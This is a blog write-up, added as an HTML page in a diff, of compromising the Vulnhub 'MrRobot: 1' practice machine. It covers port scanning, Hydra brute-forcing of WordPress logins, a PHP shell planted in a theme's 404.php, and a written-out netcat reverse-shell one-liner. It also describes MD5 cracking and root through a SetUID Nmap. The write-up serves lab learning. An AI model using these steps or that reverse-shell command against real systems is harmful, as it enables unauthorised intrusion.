@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title> MrRobot: 1 Write-Up —  &raquo;  Barvent</title>
+<meta name="description" content="Barvent's technology blog
+">
+<meta name="keywords" content="">
+<link rel="canonical" href="http://localhost:4000/write-ups/mrrobot_1_writeup/">
+        
+
+
+
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="MrRobot: 1 Write-Up" />
+<meta name="twitter:description" content="Barvent's technology blog
+" />
+<meta name="twitter:image" content="http://localhost:4000" />
+
+<!-- Google plus -->
+<meta name="author" content="">
+<link rel="author" href="">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MrRobot: 1 Write-Up">
+<meta property="og:description" content="Barvent's technology blog
+">
+<meta property="og:url" content="http://localhost:4000/write-ups/mrrobot_1_writeup/">
+<meta property="og:site_name" content="Barvent">
+
+        <link href='https://fonts.googleapis.com/css?family=Inconsolata:400,700' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="/assets/vendor/normalize-css/normalize.css">
+<link rel="stylesheet" href="/css/main.css">
+
+  <link rel="stylesheet" href="/assets/vendor/highlight/styles/solarized_dark.css">
+
+<link rel="stylesheet" href="/assets/vendor/font-awesome/css/font-awesome.css">
+
+    </head>
+
+    <body>
+        <div class="wrapper">
+            <header class="header">
+    <div class="navigation">
+        <a href="/" class="logo">Barvent</a>
+
+        <ul class="menu">
+            <li class="menu__entry"><a href="/about">About</a></li>
+            <li class="menu__entry"><a href="/">Blog</a></li>
+            <li class="menu__entry"><a href="/categories">Categories</a></li>
+        </ul>
+    </div>
+
+    <ul class="social-links">
+        
+
+        
+    </ul>
+</header>
+
+            <h1 class="page-title post-title">
+    <div class="page-title__text post-title__text">MrRobot: 1 Write-Up</div>
+    <div class="page-title__subtitle post-title__subtitle"></div>
+</h1>
+
+<div class="content">
+    <p>MrRobot 1 is an intermediate OSCP-like machine (according to the <a href="https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms">Abatchy’s list</a>) hosted on Vulnhub. This machine is a little bit different from the other ones, in this one the goal is to read the three hidden keys in the machine.</p>
+<h1>Network Scan</h1>
+<p>As always, I’ve used Nmap to sweep the network and get the IP of the target machine.
+<img src="netScan.png" alt="NetScan" />
+The IP of the target machine is 192.168.56.13.
+<br /><br /></p>
+<h1>Port Scan</h1>
+<p><img src="portScan.png" alt="PortScan" />
+There are only two ports open (80 and 443) and both of them host the same webpage.
+<br /><br /></p>
+<h1>Port 80 Enumeration</h1>
+<p>The root page has an interactive MrRobot themed page but it doesn’t lead to anything useful. Nikto found that the site has WordPress 4.3.1 installed and I found some entries inside the robots.txt file.
+<img src="nikto.png" alt="Nikto Output" />
+<img src="robots.png" alt="Robots.txt" />
+The key-1-of-3.txt file contains the first key while fsocity.dic is a dictionary with some repetitions. I removed the repetitions using “cat port80/fsocity.dic | sort | uniq &gt; port80/fsocityFilt.dic”
+<br /><br /></p>
+<h1>WordPress Bruteforce</h1>
+<p>I noticed that the WordPress login page error message was “Invalid username”, so I tried to bruteforce the username using Hydra. To do so I used the Network Firefox utility to get the necessary parameters to login.
+<img src="postParams.png" alt="POST Parameters" /> 
+<img src="invalidUser.png" alt="Invalid username message" />
+<img src="hydra1.png" alt="Hydra User Bruteforce" />
+Hydra found the “Elliot” username, so I tried to bruteforce his password using the fsocity dictionary.
+<img src="invalidPass.png" alt="Invalid password message" />
+<img src="hydra2.png" alt="Hydra Password Bruteforce" /></p>
+<h1>WordPress Access</h1>
+<p>Using the credentials found with Hydra I logged in as Elliot, who has Administrator privileges.
+<img src="wordpressUsers.png" alt="WordPress Users" />
+With the Administrator privileges we can simply edit a php file of the template with a simple php shell (I used 404.php because it is easy to get it executed). I also found that we can upload a malicious plugin or try to use both CVE-2019-8942 and CVE-2019-8943 to get RCE (I wasn’t able to exploit them).
+<img src="404Edit.png" alt="Editing 404" />
+Once I had the simple shell I executed “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.10 1234 &gt;/tmp/f” to get a reverse shell.
+<img src="revShell1.png" alt="Reverse shell 1" />
+<img src="revShell2.png" alt="Reverse shell 2" /></p>
+<h1>Daemon Shell</h1>
+<p>I found the second key and a MD5 hash inside the /home/robot/ directory, but the key wasn’t readable with my user, so I used hashcat to crack the hash.
+<img src="lsRobotHome.png" alt="ls /home/robot/" />
+<img src="passwordMD5.png" alt="password.raw-md5" />
+<img src="hashcat.png" alt="Hashcat cracking" />
+Hashcat cracked the hash successfully, giving us the password “abcdefghijklmnopqrstuvwxyz”.</p>
+<h1>Robot Shell and Privesc to Root</h1>
+<p>Using “su robot” with the “abcdefghijklmnopqrstuvwxyz” password I got access to the robot user. Running LinEnum I saw that Nmap was installed in the machine and that it had the SetUID bit enabled. Nmap has an interactive mode, so I used it to get a shell with an efective user id of 0 (root). I know that there are methods to get UID == 0, but having only the EUID was fine for me. The last key was inside /root/.
+<img src="privesc.png" alt="PrivEsc to root" /></p>
+<h1>Conclusions</h1>
+<p>This is a really straightforward machine if you know what are you doing, so I don’t really get why it is rated as intermediate. Nevertheless, it is a funny machine to root, even though it is a little bit too CTF-like for me.</p>
+
+</div>
+
+<div class="about">
+    <div class="about__devider">*****</div>
+    <div class="about__text">
+        Written by <strong>  Barvent </strong>
+        on <strong>05 August 2020</strong>
+    </div>
+</div>
+
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'barvent-github-io';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+        </div>
+
+        <script src="/assets/vendor/highlight/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+        
+    </body>
+</html>
